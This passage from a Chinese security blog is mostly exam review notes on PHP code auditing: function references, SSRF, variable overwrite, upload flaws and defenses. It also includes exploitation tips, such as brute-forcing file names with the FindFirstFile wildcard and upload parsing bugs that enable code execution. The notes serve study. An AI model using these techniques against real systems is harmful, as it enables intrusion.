<h2 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h2><p>方法和第5关相同，不过多叙述</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>遇事不决，重装解决</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计期末专题</title>
    <url>/2023/01/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%9C%9F%E6%9C%AB%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考试即将到来，复习刻不容缓。复习题由某群友整理得到。</p>
<span id="more"></span>
<h1 id="第1套试题"><a href="#第1套试题" class="headerlink" title="第1套试题"></a>第1套试题</h1><h2 id="第1题"><a href="#第1题" class="headerlink" title="第1题"></a>第1题</h2><p>在PHP中，数据会自动转换类型后再进行比较。</p>
<h3 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h3><p>检查数组中是否存在某个值，字符串区分大小写。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span>(<span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>在haystack中搜索needle，如果没有设置strict则使用宽松比较。<br>如果strict参数的值为true则in_array()函数还会检查needle的类型是否和haystack中的相同。<br>注意：在PHP 8.0.0 之前，string needle在非严格模式下将会匹配数组中的0，反之亦然。<br>返回值：如果找到needle则返回true，否则返回false<br><a href="https://www.php.net/manual/zh/function.in-array.php">in_array</a></p>
<h3 id="is-numeric-函数"><a href="#is-numeric-函数" class="headerlink" title="is_numeric()函数"></a>is_numeric()函数</h3><p>检查变量是否为数字或数字字符串。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>返回值：如果value是数字或数字字符串，返回true，否则返回false<br><a href="https://www.php.net/manual/zh/function.is-numeric.php">is_numeric</a></p>
<h2 id="第2题"><a href="#第2题" class="headerlink" title="第2题"></a>第2题</h2><h3 id="extract-函数"><a href="#extract-函数" class="headerlink" title="extract()函数"></a>extract()函数</h3><p>从数组中将变量导入到当前的符号表。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = EXTR_OVERWRITE, <span class="keyword">string</span> <span class="variable">$prefix</span> = <span class="string">&quot;&quot;</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure>
<ul>
<li>参数<br>array是一个关联数组。此函数会将键名当作变量名，值作为变量的值。对每个键&#x2F;值对都会在当前的符号表中建立变量，并受到flags和prefix的影响。必须使用关联数组，数字索引的数组将不会产生结果，除非用了EXTR_PREFIX_ALL或者EXTR_PREFIX_INVALID。<br>flags<br>对待非法&#x2F;数字和冲突的键名的方法将根据取出标记flags参数决定。可以是以下值之一：<br>EXTR_OVERWRITE	如果有冲突，覆盖已有的变量<br>EXTR_SKIP	如果有冲突，不覆盖已有的变量<br>EXTR_PREFIX_SAME	如果有冲突，在变量名前加上前缀prefix<br>EXTR_PREFIX_ALL		给所有变量名加上前缀prefix<br>EXTR_PREFIX_INVALID	仅在非法&#x2F;数字的变量名前加上前缀prefix<br>EXTR_PREFIX_IF_EXISTS	仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。<br>EXTR_REFS	将变量名作为引用提取。<br>如果没有指定flags，则被假定为EXTR_OVERWRITE<br>prefix，注意prefix仅在flags的值是EXTR_PREFIX_SAME,EXTR_PREFIX_ALL,EXTR_PREFIX_INVALID或EXTR_PREFIX_EXISTS时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。</li>
</ul>
<p>返回值，返回成功导入到符号表中的变量数目。</p>
<p><a href="https://www.php.net/manual/zh/function.extract">extract</a></p>
<h2 id="第3题"><a href="#第3题" class="headerlink" title="第3题"></a>第3题</h2><h3 id="error-reporting-函数"><a href="#error-reporting-函数" class="headerlink" title="error_reporting()函数"></a>error_reporting()函数</h3><p>设置应该报告何种PHP错误。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(?<span class="keyword">int</span> <span class="variable">$error_level</span> = <span class="literal">null</span>): <span class="keyword">int</span></span><br></pre></td></tr></table></figure>
<p>范例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 关闭所有PHP错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Report simple running errors</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// E_NOTICE是运行时的通知，显示基础提示信息</span></span><br><span class="line"><span class="comment">// E_PARSE是编译时的错误</span></span><br><span class="line"><span class="comment">// E_WARNING是运行时非致命的错误</span></span><br><span class="line"><span class="comment">// E_ERROR是运行时致命的错误</span></span><br><span class="line"><span class="comment">// (报告未初始化的变量或者捕获变量名的错误拼写)</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 除了 E_NOTICE，报告其他所有错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报告所有 PHP 错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报告所有 PHP 错误</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和 error_reporting(E_ALL); 一样</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;error_reporting&#x27;</span>, E_ALL);</span><br></pre></td></tr></table></figure>
<p><a href="https://www.runoob.com/php/func-error-reporting.html">error_reporting</a></p>
<h2 id="第4题"><a href="#第4题" class="headerlink" title="第4题"></a>第4题</h2><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p><code>php://filter</code> 是一种元封装器，设计用于数据流打开时的筛选过滤应用，这对于一体式的文件函数非常有用，类似于readfile(),file(),file_get_contents()，在数据流内容读取之前没有机会应用其它过滤器。<br><code>php://filter</code> 目标使用以下参数作为它路径的一部分。复合过滤链能够在一个路径上指定。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;		这个参数是必须的。它指定了要筛选过滤的参数</span><br><span class="line">read=&lt;读链的筛选列表&gt;		该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选链表&gt;	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;; 两个链的筛选列表&gt;		任何没有以read=或write=作前缀的筛选器列表会视情况应用于读或写链</span><br></pre></td></tr></table></figure>
<p><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;filter</a></p>
<h2 id="第5题"><a href="#第5题" class="headerlink" title="第5题"></a>第5题</h2><h3 id="MySQL常用报错函数"><a href="#MySQL常用报错函数" class="headerlink" title="MySQL常用报错函数"></a>MySQL常用报错函数</h3><p><a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">看这篇博客即可</a></p>
<h3 id="htmlspeicalchars-函数"><a href="#htmlspeicalchars-函数" class="headerlink" title="htmlspeicalchars()函数"></a>htmlspeicalchars()函数</h3><p>将特殊字符转换为HTML实体</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$string</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,</span><br><span class="line">    ?<span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$double_encode</span> = <span class="literal">true</span></span><br><span class="line">): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>参数<br>string 待转换的string<br>flags  位掩码<br>encoding 一个可选参数，定义转换字符时使用的编码<br>double_encode 关闭double_encode时，PHP不会转换现有的HTML实体，默认是全部转换。</p>
</li>
<li><p>返回值<br>转换后的string</p>
</li>
</ul>
<p><a href="https://www.php.net/manual/zh/function.htmlspecialchars">htmlspeicalchars</a></p>
<h2 id="第6题"><a href="#第6题" class="headerlink" title="第6题"></a>第6题</h2><h3 id="FindFirstFile-函数"><a href="#FindFirstFile-函数" class="headerlink" title="FindFirstFile()函数"></a>FindFirstFile()函数</h3><p>根据文件名查找文件。该函数到一个文件夹(包括子文件夹)去搜索指定文件 如果要使用附加属性去搜索文件的话 可以使用FindFirstFileEx函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HANDLE WINAPI <span class="title function_ invoke__">FindFirstFile</span>(</span><br><span class="line">	_In_   LPCTSTR lpFileName,</span><br><span class="line">	_Out_  LPWIN32_FIND_DATA lpFindFileData</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>参数<br>IpFileName 用于指定搜索目录和文件类型，可以用通配符，初次使用注意需要用转义字符（\）表达<br>IpFindFileData 用于保存搜索得到的文件信息。</p>
</li>
<li><p>返回值<br>返回HANDLE类型，为下一次搜索提供信息。当搜索失败时，返回INVALID_HANDLE_VALUE</p>
</li>
<li><p>利用方法<br>将文件名不可知部分之后的字符串用“&lt;”或“&gt;”代替即可。需要注意，只使用一个“&lt;”或“&gt;”则只能代表一个字符。如果文件名是12345或更长，这时候请求“1&lt;”或“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，可通过该方式爆破目录文件。</p>
</li>
</ul>
<h2 id="第7题"><a href="#第7题" class="headerlink" title="第7题"></a>第7题</h2><h3 id="escapeshellarg-函数"><a href="#escapeshellarg-函数" class="headerlink" title="escapeshellarg()函数"></a>escapeshellarg()函数</h3><p>把字符串转义为可以在shell命令里使用的参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellarg</span>(<span class="keyword">string</span> <span class="variable">$arg</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。<br>在 Windows 上，escapeshellarg() 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线()都会被一个额外的反斜线所转义。</p>
<ul>
<li>返回值<br>转换之后的字符串<br><a href="https://www.php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></li>
</ul>
<h3 id="strip-tags-函数"><a href="#strip-tags-函数" class="headerlink" title="strip_tags()函数"></a>strip_tags()函数</h3><p>从字符串中去除HTML和PHP标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strip_tags(string $string, array|string|null $allowed_tags = null): string</span><br></pre></td></tr></table></figure>
<ul>
<li>参数<br>allowed_tags,使用可选的第二个参数指定不被去除的标签列表。要么是 string，要么自 PHP 7.4.0 起是 array。</li>
<li>返回值<br>返回处理后的字符串<br><a href="https://www.php.net/manual/zh/function.strip-tags">strip_tags</a></li>
</ul>
<h3 id="addslashes-函数"><a href="#addslashes-函数" class="headerlink" title="addslashes()函数"></a>addslashes()函数</h3><p>使用反斜线引用字符串。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>(<span class="keyword">string</span> <span class="variable">$string</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>返回需要在转义字符之前添加反斜线的字符串。这些字符是：<br>单引号（’）<br>双引号（”）<br>反斜线（\）<br>NUL（NUL 字节）</p>
<p><a href="https://www.php.net/manual/zh/function.addslashes">addslashes</a></p>
<h3 id="mysql-real-escape-string-函数"><a href="#mysql-real-escape-string-函数" class="headerlink" title="mysql_real_escape_string()函数"></a>mysql_real_escape_string()函数</h3><p>转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集<br>警告：本扩展自 PHP 5.5.0 起已废弃，并在自 PHP 7.0.0 开始被移除。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="keyword">string</span> <span class="variable">$unescaped_string</span>, resource <span class="variable">$link_identifier</span> = <span class="literal">NULL</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.php.net/manual/zh/function.mysql-real-escape-string">mysql_real_escape_string</a></p>
<h2 id="第8题"><a href="#第8题" class="headerlink" title="第8题"></a>第8题</h2><h3 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h3><p>RSA算法，DSA算法，ECC算法，DH算法，SM2算法</p>
<h3 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h3><p>AES算法，DES算法，3DES算法，RC算法，SM1算法</p>
<h2 id="第9题"><a href="#第9题" class="headerlink" title="第9题"></a>第9题</h2><p>验证码更多放在会话（Session）中</p>
<h2 id="第10题"><a href="#第10题" class="headerlink" title="第10题"></a>第10题</h2><p>预防撞库攻击的方式：</p>
<ul>
<li>强制用户密码的强度。</li>
<li>定期强制用户更换密码</li>
<li>在账户相关接口加强人机防控策略</li>
<li>重要业务流程采用二次验证</li>
<li>建立业务维度的账号异常指标监控，并及时处理风险账号</li>
<li>借助安全工具做好防撞库攻击</li>
</ul>
<h2 id="第11题"><a href="#第11题" class="headerlink" title="第11题"></a>第11题</h2><h3 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h3><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。<br>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。<br>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
<h2 id="第12题"><a href="#第12题" class="headerlink" title="第12题"></a>第12题</h2><p>充值支付漏洞的主要应对方法：<br>后端检查每一项值，包括支付状态。商品单价及总价不能从客户端获取。<br>校验价格、数量参数，比如产品数量只能为正整数，并限制购买数量不能超过65535。<br>与第三方支付平台检查，实际支付的金额是否与订单金额一致。<br>如果给用户退款，要使用原路、原订单退回。<br>支付参数进行 MD5 加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题。<br>金额超过阈值，进行人工审核</p>
<h2 id="第13题"><a href="#第13题" class="headerlink" title="第13题"></a>第13题</h2><h3 id="iconv-函数"><a href="#iconv-函数" class="headerlink" title="iconv()函数"></a>iconv()函数</h3><p>字符串按要求的字符编码来转换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iconv(string $in_charset, string $out_charset, string $str): string</span><br></pre></td></tr></table></figure>
<p>将字符串 str 从 in_charset 转换编码到 out_charset。</p>
<ul>
<li>参数<br>in_charset,输入的字符集。<br>out_charset,输出的字符集。<br>str,要转换的字符串</li>
<li>返回值<br>返回转换后的字符串，或者在失败后返回false<br><a href="https://www.php.net/manual/zh/function.iconv">iconv</a></li>
</ul>
<h2 id="第14题"><a href="#第14题" class="headerlink" title="第14题"></a>第14题</h2><h3 id="is-null-函数"><a href="#is-null-函数" class="headerlink" title="is_null()函数"></a>is_null()函数</h3><p>检测变量是否为null</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_null</span>(<span class="keyword">mixed</span> <span class="variable">$value</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<ul>
<li>返回值<br>如果value为null，返回true，否则返回false</li>
</ul>
<h2 id="第15题"><a href="#第15题" class="headerlink" title="第15题"></a>第15题</h2><h3 id="PHP禁用函数"><a href="#PHP禁用函数" class="headerlink" title="PHP禁用函数"></a>PHP禁用函数</h3><p>PHP禁用函数的方法：首先打开“php.ini”配置文件；然后查找字符“disable_functions”，该字符是PHP禁用函数的配置项；接着在该配置项加上需要禁用的函数，多个函数用英文逗号分隔；最后保存重启即可。</p>
<h2 id="第16题"><a href="#第16题" class="headerlink" title="第16题"></a>第16题</h2><h3 id="require-函数"><a href="#require-函数" class="headerlink" title="require()函数"></a>require()函数</h3><p>文件包含过程中出现错误，抛出错误，退出程序执行</p>
<h2 id="第17题"><a href="#第17题" class="headerlink" title="第17题"></a>第17题</h2><h3 id="unlink-函数"><a href="#unlink-函数" class="headerlink" title="unlink()函数"></a>unlink()函数</h3><p>删除文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, ?resource <span class="variable">$context</span> = <span class="literal">null</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>删除 filename。和 Unix C 的 unlink() 函数相似。 发生错误时会产生一个 E_WARNING 级别的错误。</p>
<ul>
<li>参数<br>filename,文件的路径。如果文件是符号链接，将会删除符号链接。在Windows上，删除目录的符号链接，必须使用rmdir()<br>context,上下文流（context stream）resource</li>
<li>返回值<br>成功时返回true，或在失败时返回false</li>
</ul>
<h2 id="第18题"><a href="#第18题" class="headerlink" title="第18题"></a>第18题</h2><h3 id="system-函数"><a href="#system-函数" class="headerlink" title="system()函数"></a>system()函数</h3><p>执行外部程序，并且显示输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>本函数执行 command 参数所指定的命令，并且输出执行结果。<br>如果 PHP 运行在服务器模块中，system() 函数还会尝试在每行输出完毕之后，自动刷新 web 服务器的输出缓存。<br>如果要获取一个命令未经任何处理的原始输出，请使用 passthru() 函数。</p>
<ul>
<li>返回值<br>成功则返回命令输出的最后一行，失败则返回false</li>
</ul>
<h2 id="第19题"><a href="#第19题" class="headerlink" title="第19题"></a>第19题</h2><h3 id="绝对等于-x3D-x3D-x3D"><a href="#绝对等于-x3D-x3D-x3D" class="headerlink" title="绝对等于(&#x3D;&#x3D;&#x3D;)"></a>绝对等于(&#x3D;&#x3D;&#x3D;)</h3><p>如果x等于y，且它们类型相同，则返回true。比较时不做类型转换</p>
<h2 id="第20题"><a href="#第20题" class="headerlink" title="第20题"></a>第20题</h2><h3 id="程序目录结构"><a href="#程序目录结构" class="headerlink" title="程序目录结构"></a>程序目录结构</h3><ol>
<li>函数集文件，通常命名中包含functions或common等关键字，这些文件里面是一些公共的函数，提供其他文件统一调用，所以大多数文件都会在文件头部包含到其它文件。寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。</li>
<li>配置文件，通常命名中包括config关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息。从这个文件中可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用双引号括起来，如果是双引号，则很可能会存在代码执行漏洞。</li>
<li>安全过滤文件，安全过滤文件对我们做代码审计至关重要，关系到我们挖掘到的可疑点能不能利用，通常命名中有filter、safe、check等关键字，这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数，其他的则相对少见。而目前大多数应用都会在程序的入口循环对所有参数使用addslashes()函数进行过滤。</li>
<li>index文件，index是一个程序的入口文件，所以通常我们只要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件，其中核心的文件又有哪些。而不同目录的index文件也有不同的实现方式，建议最好先将几个核心目录的index文件都简单读一遍。</li>
</ol>
<h2 id="第21题"><a href="#第21题" class="headerlink" title="第21题"></a>第21题</h2><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>文件上传漏洞在代码审计的时候，最快的方法就是直接去搜索 <code>move_uploaded_file()</code> 函数，再去看调用这个函数上传文件的代码存不存在未限制上传格式或者可以绕过，其中问题比较多的是黑名单限制文件格式以及未更改文件名的方式，没有更改文件名的情况下，在Apache利用其向前寻找解析格式和IIS6的分号解析bug都可以执行代码。</p>
<h2 id="第22题"><a href="#第22题" class="headerlink" title="第22题"></a>第22题</h2><h3 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h3><p>执行一个正则表达式的搜索和替换。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">string</span>|<span class="keyword">array</span>|<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>搜素subject中匹配pattern的部分，以replacement进行替换。</p>
<ul>
<li><p>参数<br>pattern,要搜索的模式。可以是一个字符串或字符串数组。<br>replacement,用于替换的字符串或字符串数组。<br>subject,要进行搜索和替换的字符串或字符串数组。<br>limit,每个模式在每个subject上进行替换的最大次数。默认是-1(无限)<br>count,如果指定，将会被填充为完成的替换次数。</p>
</li>
<li><p>返回值<br>如果subject是一个数组，preg_replace()返回一个数组，其他情况下返回一个字符串。<br>如果匹配被查找到，替换后的 subject 被返回，其他情况下返回没有改变的 subject。如果发生错误，返回 null 。</p>
</li>
</ul>
<p><a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace</a></p>
<h2 id="第23题"><a href="#第23题" class="headerlink" title="第23题"></a>第23题</h2><p>函数escapeshellarg()的功能是过滤参数，将参数限制在一对双引号里，确保参数为一个字符串，把双引号替换为空格。<br>详细见<strong>第7题</strong>的内容</p>
<h2 id="第24题"><a href="#第24题" class="headerlink" title="第24题"></a>第24题</h2><p><code>import_request_variables()</code> 函数作用是把GET、POST、COOKIE的参数注册成变量，用在register_globals被禁止的时候，需要PHP 4.1至5.4之间的版本，不过建议是不开启register_globals也不要使用import_request_variables()函数，这样容易导致变量覆盖。</p>
<h2 id="第25题"><a href="#第25题" class="headerlink" title="第25题"></a>第25题</h2><p>常见的代码审计思路：<br>1）根据敏感关键字回溯参数传递过程。 2）查找可控变量，正向追踪变量传递过程。 3）寻找敏感功能点，通读功能点代码。</p>
<h2 id="第26题"><a href="#第26题" class="headerlink" title="第26题"></a>第26题</h2><p>需要先构造好利用代码写入网站保存，在第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞叫做二次漏洞。</p>
<h1 id="第2套试题"><a href="#第2套试题" class="headerlink" title="第2套试题"></a>第2套试题</h1><h2 id="第1题-1"><a href="#第1题-1" class="headerlink" title="第1题"></a>第1题</h2><h3 id="全局变量注册开关"><a href="#全局变量注册开关" class="headerlink" title="全局变量注册开关"></a>全局变量注册开关</h3><p>register_globals即全局注册变量开关，register_globals是php.ini文件里面的一个安全设置选项。<br>当选项关闭的时候，PHP使用$_GET,$_POST,$_COOKIE或$_SESSION等数组来接收客户端传递过来的参数；<br>当选项开启的时候，客户端传过来的参数会被直接注册为全局变量来使用。</p>
<h3 id="allow-url-include参数（只影响RFI，不影响LFI）"><a href="#allow-url-include参数（只影响RFI，不影响LFI）" class="headerlink" title="allow_url_include参数（只影响RFI，不影响LFI）"></a>allow_url_include参数（只影响RFI，不影响LFI）</h3><p>是否允许include()和require()函数包含URL（HTTP，HTTPS）作为文件处理</p>
<h3 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h3><p>默认情况下，PHP 指令 magic_quotes_gpc 为 on，它主要是对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes ()。 不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes ()，因为这样会导致双层转义。 遇到这种情况时可以使用函数 get_magic_quotes_gpc () 进行检测。</p>
<h3 id="magic-quotes-runtime"><a href="#magic-quotes-runtime" class="headerlink" title="magic_quotes_runtime"></a>magic_quotes_runtime</h3><p>在php.ini的配置文件中，有个布尔值的设置，就是magic_quotes_runtime,当它打开时，php的大部分函数自动的给从外部引入的 (包括数据库或者文件)数据中的溢出字符加上反斜线。 当然如果重复给溢出字符加反斜线，那么字符串中就会有多个反斜线，所以这时就要用set_magic_quotes_runtime ()与 get_magic_quotes_runtime ()设置和检测php.ini文件中magic_quotes_runtime状态。</p>
<h2 id="第2题-1"><a href="#第2题-1" class="headerlink" title="第2题"></a>第2题</h2><p>参考第1套试题的第8题。</p>
<h2 id="第3题-1"><a href="#第3题-1" class="headerlink" title="第3题"></a>第3题</h2><p>常用验证码类型：</p>
<ol>
<li>数字、字母、中文组合</li>
<li>图片识别</li>
<li>滑动验证</li>
<li>短信&#x2F;邮箱&#x2F;电话验证</li>
<li>语音验证<br>本题属于题目有误，无正确答案</li>
</ol>
<h2 id="第4题-1"><a href="#第4题-1" class="headerlink" title="第4题"></a>第4题</h2><h3 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h3><p>把第一个参数作为回调函数调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数</p>
<ul>
<li>参数<br>callback,将被调用的回调函数<br>args,0个或以上的参数，被传入回调函数</li>
</ul>
<h3 id="可能造成代码执行漏洞的函数"><a href="#可能造成代码执行漏洞的函数" class="headerlink" title="可能造成代码执行漏洞的函数"></a>可能造成代码执行漏洞的函数</h3><p>system, exec, shell_exec, passthru, eval, assert, preg_replace, call_user_func</p>
<h2 id="第5题-1"><a href="#第5题-1" class="headerlink" title="第5题"></a>第5题</h2><p>命令执行漏洞的防御：</p>
<ol>
<li>使用自定义函数或者函数库来代替外部命令的功能。</li>
<li>使用escapeshellarg函数来处理命令参数</li>
<li>使用safe_mode_exec_dir指定可执行文件的命令</li>
<li>使用白名单对可包含文件进行限制</li>
<li>严格检查include类的文件包含函数中的参数是否外界可控。</li>
</ol>
<h2 id="第6题-1"><a href="#第6题-1" class="headerlink" title="第6题"></a>第6题</h2><p>变量覆盖常用函数或方式：</p>
<ol>
<li>register_global注册开关</li>
<li>extract()</li>
<li>$$符号（可变变量）</li>
<li>import_request_variables()</li>
<li>parse_str()<br><a href="https://y4er.com/posts/variable-coverage/#import_request_variables">变量覆盖</a></li>
</ol>
<h2 id="第7题-1"><a href="#第7题-1" class="headerlink" title="第7题"></a>第7题</h2><p>王小云对MD5算法的碰撞问题研究方面做出了贡献。</p>
<h2 id="第8题-1"><a href="#第8题-1" class="headerlink" title="第8题"></a>第8题</h2><p>A选项设计思路不可行</p>
<h2 id="第9题-1"><a href="#第9题-1" class="headerlink" title="第9题"></a>第9题</h2><p>为了防止客户端可修改价格，那么单价和总价不可从客户端获取<br>为了防止数量出现漏洞，需要验证购买数量不能小于等于0<br>为了防止利用时间差多次购买，进行账户支付锁定机制</p>
<h2 id="第10题-1"><a href="#第10题-1" class="headerlink" title="第10题"></a>第10题</h2><p>一个文件管理功能为了保证安全，在满足业务需求的情况下，设计的时候应该遵循以下几个点：</p>
<ol>
<li>禁止写入脚本可在服务器端执行的文件</li>
<li>限制文件管理功能操作的目录</li>
<li>限制文件管理功能访问权限</li>
<li>禁止上传特殊字符文件名的文件</li>
</ol>
